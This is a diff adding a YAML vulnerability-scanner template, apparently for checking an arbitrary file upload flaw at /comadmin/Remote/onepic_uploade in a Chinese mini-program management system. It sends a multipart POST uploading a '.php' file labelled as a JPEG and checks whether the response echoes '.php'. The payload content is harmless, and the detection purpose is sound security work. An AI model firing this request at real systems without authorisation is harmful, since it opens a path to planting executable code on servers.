@@ -1,0 +1,31 @@
+id:
+
+info:
+  name: 万能小程序运营管理系统onepic_uploade任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /comadmin/Remote/onepic_uploade?file=file
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  data: |
+    ------WebKitFormBoundaryBiKyL9D0p5OtH5zz
+    Content-Disposition: form-data; name="file"; filename="1123.php"
+    Content-Type: image/jpeg
+
+    123456
+    ------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
+response1:
+  headers:
+  body: .php
+  code: 200
+requests2:
+response2:
